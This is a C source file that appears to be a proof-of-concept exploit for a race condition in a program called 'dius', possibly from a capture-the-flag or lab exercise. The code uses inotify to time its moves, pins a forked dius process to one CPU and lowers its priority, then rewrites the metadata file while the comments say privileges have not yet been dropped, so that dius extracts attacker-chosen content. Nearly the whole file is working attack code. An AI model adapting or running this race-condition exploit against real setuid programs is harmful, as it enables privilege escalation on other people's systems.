#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

const char extract_metadata[] = "EXTRACT:1\nFILENAME:/tmp/out.dius\nWEB:1\n";

void set_affinity(int cpu) {
  cpu_set_t cpuset;

  CPU_ZERO(&cpuset);
  CPU_SET(cpu, &cpuset);

  if (sched_setaffinity(0, sizeof(cpuset), &cpuset)) {
    perror("[-] Setting CPU affinity");
    exit(1);
  }
}


int msleep(long msec)
{
    struct timespec ts;
    int res;

    if (msec < 0)
    {
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do {
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}

int main(int argc, char *argv[]) {
  int notifyfd = inotify_init();
  char evtbuf[sizeof(struct inotify_event) + NAME_MAX + 1] = {0};
  if (notifyfd < 0) {
    perror("[-] inotify");
    exit(1);
  }

  int dirfd = open("/tmp/dius", O_PATH);
  if (dirfd < 0) {
    perror("[-] open dir");
    exit(1);
  }

  inotify_add_watch(notifyfd, "/tmp/dius", IN_CREATE | IN_CLOSE);

  if (!fork()) {
    nice(19);
    set_affinity(1);
    msleep(200);
    execlp("dius", "dius", "crw", "result.dius", "x:/tmp/somefile", NULL);
  }

  // the first event read is when the metadata file is closed from initial
  // write. we'll open the file and get ready to replace its contents
  read(notifyfd, evtbuf, sizeof(evtbuf));
  int targetfd = openat(dirfd, ((struct inotify_event*)evtbuf)->name, O_WRONLY);

  // The next event read is the file close() after the first
  // get_metadata_key call in interpret_metadata_file, dius finds the
  // CREATE key
  read(notifyfd, evtbuf, sizeof(evtbuf));
  // The next event read is the file close() after the first
  // get_metadata_key call in interpret_metadata_file, dius finds the
  // WEB key
  read(notifyfd, evtbuf, 0);

  // Now that dius has read CREATE and WEB, it has not dropped
  // privileges. But, we want the next call to get_metadata_key(mf,
  // "CREATE") to return NULL, so at this moment we'll race to replace
  // the contents of the metadata file
  if (write(targetfd, extract_metadata, sizeof(extract_metadata)-1) < 0) {
    perror("Writing extract metadata");
    exit(1);
  }

  close(targetfd);

  return 0;
}
